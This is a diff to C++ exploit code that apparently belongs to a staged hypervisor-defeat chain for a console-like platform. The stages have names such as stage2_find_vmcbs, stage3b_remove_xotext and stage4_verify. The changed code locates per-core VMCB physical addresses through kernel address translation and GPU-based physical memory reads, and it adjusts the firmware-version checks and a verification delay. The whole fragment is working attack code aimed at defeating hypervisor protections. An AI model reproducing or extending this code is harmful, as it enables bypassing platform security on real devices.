@@ -130,7 +130,7 @@ int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
     uint64_t vcpu_off = fw_off(ctx->fw, "HV_VCPU");
     uint64_t stride   = fw_off(ctx->fw, "HV_VCPU_CPUID");
     // Testing direct VMCB on 04.03
-    if ((!vcpu_off || !stride) && ctx->fw != 0x0403) {
+    if ((!vcpu_off || !stride) && ctx->fw < 0x0300) {
         std::print("  missing HV_VCPU offsets for fw 0x{:04x}\n", ctx->fw);
         return -1;
     }
@@ -167,31 +167,26 @@ int stage2_find_vmcbs(hv_defeat_ctx *ctx) {
                 ctx->vmcb_count++;
             }
 
-            continue;
-        }
-
-        if (ctx->fw >= 0x0300) {
-            // read directly from PA via GPU DMA
-            ptr_pa = hv_data_pa + vcpu_off + (uint64_t)c * stride;
-        } else {
+        } 
+        else {
             // use VA + pmap_kextract (embedded HV has valid kernel VAs)
             uint64_t ptr_va = ctx->hv_data_va + vcpu_off + (uint64_t)c * stride;
             ptr_pa = pmap_kextract(ptr_va);
-        }
 
-        uint64_t vmcb_va = gpu_read_phys8(ptr_pa);
-        if ((vmcb_va >> 32) != 0xFFFFFFFF || (vmcb_va & 0xFFF) != 0) {
-            std::print("  core {:2d}: bad vmcb_va 0x{:x}\n", c, vmcb_va);
-            return -2;
-        }
+             uint64_t vmcb_va = gpu_read_phys8(ptr_pa);
+            if ((vmcb_va >> 32) != 0xFFFFFFFF || (vmcb_va & 0xFFF) != 0) {
+                std::print("  core {:2d}: bad vmcb_va 0x{:x}\n", c, vmcb_va);
+                return -2;
+            }
 
-        uint64_t vmcb_pa = pmap_kextract(vmcb_va);
-        std::print("  core {:2d}: pa=0x{:x}\n", c, vmcb_pa);
+            uint64_t vmcb_pa = pmap_kextract(vmcb_va);
+            std::print("  core {:2d}: pa=0x{:x}\n", c, vmcb_pa);
 
-        if (ctx->vmcb_count < MAX_VMCBS) {
-            ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
-            ctx->vmcb_count++;
-        }
+            if (ctx->vmcb_count < MAX_VMCBS) {
+                ctx->vmcb_pas[ctx->vmcb_count] = vmcb_pa;
+                ctx->vmcb_count++;
+            }
+        }  
     }
     std::print("  {} vmcbs\n", ctx->vmcb_count);
     return ctx->vmcb_count == 0 ? -2 : 0;
@@ -298,7 +293,7 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
 
 
 int stage4_verify(hv_defeat_ctx *ctx) {
-    usleep(5000000);
+    usleep(15000000);
     std::print("\n[stage4] verify\n");
 
     pin_to_first_available_core();
